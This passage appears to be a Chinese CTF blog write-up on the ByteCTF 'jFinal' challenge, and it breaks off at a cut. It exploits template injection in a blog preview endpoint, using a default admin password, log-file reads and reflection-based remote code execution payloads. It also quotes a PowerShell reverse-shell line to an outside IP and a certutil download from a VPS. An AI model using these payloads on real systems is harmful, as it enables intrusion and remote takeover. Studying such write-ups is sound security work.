@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ByteCTF jFinal1.配置本地环境看sql语句没新建数据库，先创建一个database名为jfinal_blog  1create database jfinal_blog;  改变&#x2F;config&#x2F;app-config-dev.txt里面的mysql密码为本地mysql的:  在mysql的shell中，导入后缀为.sql的文件 1source jfinal_blog.sql  启动环境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCTF-jFinal">
+<meta property="og:url" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/index.html">
+<meta property="og:site_name" content="Yenan&#39;s blog">
+<meta property="og:description" content="ByteCTF jFinal1.配置本地环境看sql语句没新建数据库，先创建一个database名为jfinal_blog  1create database jfinal_blog;  改变&#x2F;config&#x2F;app-config-dev.txt里面的mysql密码为本地mysql的:  在mysql的shell中，导入后缀为.sql的文件 1source jfinal_blog.sql  启动环境">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211021153438506.png">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211017212844151.png">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/634c4d64-98f8-4a80-b1d0-9ec3e8d99786.png">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/2bd050be-f23d-4186-8bea-ceacf49eaf9a.png">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/7cd60cd3-5e55-4c39-9fb7-8859dee2a768.png">
+<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/8a7373ee-99ea-4346-8845-d6b221e0f0db.png">
+<meta property="article:published_time" content="2022-03-25T02:12:49.000Z">
+<meta property="article:modified_time" content="2022-03-25T02:14:04.458Z">
+<meta property="article:author" content="Yenan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211021153438506.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ByteCTF-jFinal</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&text=ByteCTF-jFinal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&is_video=false&description=ByteCTF-jFinal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ByteCTF-jFinal&body=Check out this article: https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&name=ByteCTF-jFinal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&t=ByteCTF-jFinal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ByteCTF-jFinal"><span class="toc-number">1.</span> <span class="toc-text">ByteCTF jFinal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">1.配置本地环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%9A"><span class="toc-number">3.</span> <span class="toc-text">2.题目环境打通</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ByteCTF-jFinal
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yenan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-25T02:12:49.000Z" itemprop="datePublished">2022-03-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="ByteCTF-jFinal"><a href="#ByteCTF-jFinal" class="headerlink" title="ByteCTF jFinal"></a>ByteCTF jFinal</h3><h3 id="1-配置本地环境"><a href="#1-配置本地环境" class="headerlink" title="1.配置本地环境"></a>1.配置本地环境</h3><p>看sql语句没新建数据库，先创建一个database名为jfinal_blog </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database jfinal_blog;</span><br></pre></td></tr></table></figure>
+
+<p>改变<code>/config/app-config-dev.txt</code>里面的mysql密码为本地mysql的:</p>
+<p><img src="ByteCTF-jFinal.assets/image-20211021153438506.png" alt="image-20211021153438506"></p>
+<p>在mysql的shell中，导入后缀为<code>.sql</code>的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source jfinal_blog.sql</span><br></pre></td></tr></table></figure>
+
+<p>启动环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jfinal.bat start</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果想抓包，这里就不要访问 127.0.0.1:30000，因为本地回环网卡burpsuite是抓不到的。</strong></p>
+<p>这里看ipconfig后得知本机ip是<code>192.168.43.252</code>，所以访问<code>http://192.168.43.252:30000/</code>然后开一般的代理就能抓到包。</p>
+<h3 id="2-题目环境打通"><a href="#2-题目环境打通" class="headerlink" title="2.题目环境打通"></a>2.题目环境打通</h3><p><code>/admin</code>路由 后台默认弱口令 <code>jFinal  111111</code></p>
+<p>审计+黑盒，发现新建博客的内容编辑处有ssti，ssti的poc是 <code>#(2*2)</code> 就会被渲染为 <code>4</code></p>
+<img src="ByteCTF-jFinal.assets/image-20211017212844151.png" alt="image-20211021150956578" style="zoom: 67%;" />
+
+
+
+<p>关注模板用法 offical document <a target="_blank" rel="noopener" href="https://jfinal.com/doc/6-4">https://jfinal.com/doc/6-4</a> ：</p>
+<blockquote>
+<ol>
+<li>include指令用于将外部模板内容包含进来，被包含的内容会被解析成为当前模板中的一部分进行使用，如下是代码示例：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;#include(&quot;sidebar.html&quot;)</span><br></pre></td></tr></table></figure>
+
+<pre><code>\#include 指令第一个参数必须为 String 常量，当以 ”/” 打头时将以 baseTemplatePath 为相对路径去找文件，否则将以使用                #include 指令的当前模板的路径为相对路径去找文件。\
+</code></pre>
+<ol start="2">
+<li>  render指令在使用上与include指令几乎一样</li>
+</ol>
+</blockquote>
+<p>这里在burpsuite中使用<code>#include()</code>或者<code>#render()</code>读到log文件里面别人打的 大概知道别人的方法是需要反射来绕过沙箱，类似于安全客这篇分析：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/151398#h3-6">https://www.anquanke.com/post/id/151398#h3-6</a> </p>
+<p>请求的内容</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blog.title=123&amp;blog.content=#include(&quot;../log/jfinal-blog.log&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blog.title=123&amp;blog.content=#render(&quot;../log/jfinal-blog.log&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>发现别人的payload，这里应该是别人打错了才会抛出错误类型和源语句，打通的话不保留的：</p>
+<p><img src="ByteCTF-jFinal.assets/634c4d64-98f8-4a80-b1d0-9ec3e8d99786.png"></p>
+<p>读log的完整报文：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.252:30000</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.43.252:30000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.43.252:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=f0b56f4cce334eda98d7d243da59d538</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-leaf">blog.title=123&amp;blog.content=<span class="function"><span class="keyword">#</span><span class="title">include</span><span class="params">(<span class="string">&quot;../log/jfinal-blog.log&quot;</span>)</span></span></span></span><br></pre></td></tr></table></figure>
+
+<img src="ByteCTF-jFinal.assets/2bd050be-f23d-4186-8bea-ceacf49eaf9a.png" style="zoom: 67%;" />
+
+<p>这个选手为什么能考虑到需要去反射绕过呢，代码审计看到，因为这里有springsecurity机制：</p>
+<p><img src="ByteCTF-jFinal.assets/7cd60cd3-5e55-4c39-9fb7-8859dee2a768.png"></p>
+<p>学习这里的姿势： <a target="_blank" rel="noopener" href="https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</a>  但题目没有这个库：<code>org.apache.commons.lang3.reflect.ConstructorUtils::invokeConstructor</code></p>
+<p>在代码审计中发现一处类的调用 <code>ClassLoaderUtil </code></p>
+<p>也就是 <code>net.sf.ehcache.util.ClassLoaderUtil::createNewInstance</code></p>
+<p><img src="ByteCTF-jFinal.assets/8a7373ee-99ea-4346-8845-d6b221e0f0db.png"></p>
+<p>但上述博客后面的方法可以参考： <a target="_blank" rel="noopener" href="https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</a> 文章结尾处</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(x=(java.net.URLClassLoader::getSystemClassLoader()).loadClass(&quot;javax.script.ScriptEngineManager&quot;))</span><br><span class="line">#set(payload=&quot;powershell -nop -exec bypass -c \\&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 7777\\&quot;&quot;)</span><br><span class="line">#set(poc=&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;+payload+&quot;\&quot;)&quot;)</span><br><span class="line">#((org.apache.commons.lang3.reflect.ConstructorUtils::invokeConstructor(x)).getEngineByExtension(&quot;js&quot;).eval(poc))</span><br></pre></td></tr></table></figure>
+
+<p>也就是，利用 <code>ScriptEngineManager</code>获取JS脚本引擎，再通过 <code>eval()</code>动态执行<code>java.lang.Runtime.getRuntime().exec()</code>，来执行命令</p>
+<p>这里就使用的<code>getEngineByExtension(&#39;js&#39;).eval(poc)</code>方法来执行代码</p>
+<p>使用静态类 <code>net.sf.ehcache.util.ClassLoaderUtil::createNewInstance</code> 拿到 <code>javax.script.ScriptEngineManager</code> 再使用反射RCE</p>
+<p>payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blog.title=$&#123;&#123;<span class="number">123</span>&#125;&#125;&amp;blog.content=#set(poc=<span class="string">&quot;</span></span><br><span class="line"><span class="string">var clz = Java.type(&#x27;java.lang.String[]&#x27;).class;</span></span><br><span class="line"><span class="string">var rclz = Java.type(&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;).class;</span></span><br><span class="line"><span class="string">var bclz = Java.type(&#x27;boolean&#x27;).class;</span></span><br><span class="line"><span class="string">var pclz = Java.type(&#x27;java.lang.ProcessImpl&#x27;).class;</span></span><br><span class="line"><span class="string">var cmd = java.lang.reflect.Array.newInstance(java.lang.String.class,2);</span></span><br><span class="line"><span class="string">java.lang.reflect.Array.set(cmd,0,&#x27;touch&#x27;);</span></span><br><span class="line"><span class="string">java.lang.reflect.Array.set(cmd,1,&#x27;/tmp/pwned&#x27;);</span></span><br><span class="line"><span class="string">var m = pclz.getDeclaredMethod(&#x27;start&#x27;, clz, java.util.Map.class, java.lang.String.class, rclz, bclz);</span></span><br><span class="line"><span class="string">m.setAccessible(true);</span></span><br><span class="line"><span class="string">print(m);</span></span><br><span class="line"><span class="string">m.invoke(null,cmd,  null, null,null ,false);</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)).getEngineByExtension(<span class="string">&#x27;js&#x27;</span>).eval(poc))</span><br></pre></td></tr></table></figure>
+
+<p>再用批处理脚本导出flag，在vps上写个bat文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="built_in">export</span> HKEY_CURRENT_USER\ByteCTF  C:/Users/ctf/jfinal-blog/jfinal-blog/webapp/1.reg</span><br></pre></td></tr></table></figure>
+
+<p>先把批处理脚本下载到web目录下 测试下访问性</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.105.169.140:30000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.105.169.140:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1081</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.105.169.140:30000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=e7c0e2d6fa484e2fb8851461e2a30e1f</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">blog.title=$&#123;&#123;<span class="number">123</span>&#125;&#125;&amp;blog.content=<span class="comment">#set(poc=&quot;</span></span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> clz = Java.type(<span class="string">&#x27;java.lang.String[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> rclz = Java.type(<span class="string">&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> bclz = Java.type(<span class="string">&#x27;boolean&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> pclz = Java.type(<span class="string">&#x27;java.lang.ProcessImpl&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> cmd = java.lang.reflect.<span class="built_in">Array</span>.newInstance(java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>,<span class="number">8</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">0</span>,<span class="string">&#x27;cmd&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">1</span>,<span class="string">&#x27;/c&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">2</span>,<span class="string">&#x27;certutil.exe&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">3</span>,<span class="string">&#x27;-urlcache&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">4</span>,<span class="string">&#x27;-split&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">5</span>,<span class="string">&#x27;-f&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">6</span>,<span class="string">&#x27;http://your vps/bat&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">7</span>,<span class="string">&#x27;C:/Users/ctf/jfinal-blog/jfinal-blog/webapp/1.bat&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript"></span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> m = pclz.getDeclaredMethod(<span class="string">&#x27;start&#x27;</span>, clz, java.util.<span class="built_in">Map</span>.<span class="keyword">class</span>, java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>, rclz, bclz);</span></span><br><span class="line"><span class="language-livescript">m.setAccessible(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="built_in">print</span>(m);</span></span><br><span class="line"><span class="language-livescript">m.invoke(<span class="literal">null</span>,cmd,  <span class="literal">null</span>, <span class="literal">null</span>,<span class="literal">null</span> ,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="string">&quot;)</span></span></span><br><span class="line"><span class="string"><span class="language-livescript">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;</span>javax.script.ScriptEngineManager<span class="string">&quot;)).getEngineByExtension(&#x27;js&#x27;).eval(poc))</span></span></span><br></pre></td></tr></table></figure>
+
+<p>然后执行这个批处理文件 把flag写到web目录下:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.105.169.140:30000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.105.169.140:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>830</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.105.169.140:30000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=e7c0e2d6fa484e2fb8851461e2a30e1f</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">blog.title=$&#123;&#123;<span class="number">123</span>&#125;&#125;&amp;blog.content=<span class="comment">#set(poc=&quot;</span></span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> clz = Java.type(<span class="string">&#x27;java.lang.String[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> rclz = Java.type(<span class="string">&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> bclz = Java.type(<span class="string">&#x27;boolean&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> pclz = Java.type(<span class="string">&#x27;java.lang.ProcessImpl&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> cmd = java.lang.reflect.<span 